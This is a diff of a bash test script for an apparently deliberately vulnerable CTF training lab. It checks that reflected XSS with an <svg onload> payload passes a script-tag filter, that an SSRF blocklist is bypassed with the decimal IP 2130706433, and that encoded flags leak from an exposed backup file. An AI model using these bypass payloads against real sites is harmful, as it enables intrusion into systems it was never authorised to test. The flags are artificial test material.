@@ -25,9 +25,9 @@ B64=$($A "curl -s $T/storage-backup/nimbus_db_2024-01-15.sql.txt | grep -oE 'bas
 DEC=$($A "echo '$B64' | base64 -d 2>/dev/null")
 chk "EJPT{3nc0d3d" "$DEC" "storage-backup base64 dekod -> flag"
 
-echo "### 3) Reflected XSS + WAF + flag.php guard"
-WAF=$($A "curl -s '$T/search.php?q=%3Cscript%3Ealert(1)%3C/script%3E'")
-chk "blocked by the Nimbus WAF" "$WAF" "naive <script> -> WAF bloklaydi"
+echo "### 3) Reflected XSS (jim filtr) + flag.php guard"
+NAIVE=$($A "curl -s '$T/search.php?q=%3Cscript%3Ealert(1)%3C/script%3E'")
+if echo "$NAIVE" | grep -q '<script>alert'; then echo "  [FAIL] naive <script> jim filtrlanmadi"; fail=$((fail+1)); else echo "  [PASS] naive <script> jim filtrlanadi (banner yo'q)"; pass=$((pass+1)); fi
 REF=$($A "curl -s '$T/search.php?q=%3Csvg%20onload%3Dalert(1)%3E'")
 chk "<svg onload=alert(1)>" "$REF" "<svg onload> -> reflected (unescaped, bypass)"
 FD=$($A "curl -s -o /dev/null -w '%{http_code}' $T/flag.php")
@@ -37,7 +37,7 @@ chk "EJPT{w4f_byp4ss" "$FG" "flag.php same-origin -> XSS flag"
 
 echo "### 4) SSRF + decimal-IP bypass — fetch.php"
 BL=$($A "curl -s '$T/fetch.php?url=http://127.0.0.1/admin-metrics.php'")
-chk "Blocked: internal" "$BL" "127.0.0.1 -> bloklanadi"
+chk "reach that link" "$BL" "127.0.0.1 -> generic error (blocklist, banner yo'q)"
 SS=$($A "curl -s '$T/fetch.php?url=http://2130706433/admin-metrics.php'")
 chk "EJPT{ssrf_d3c1m4l" "$SS" "decimal 2130706433 -> admin-metrics flag"
 
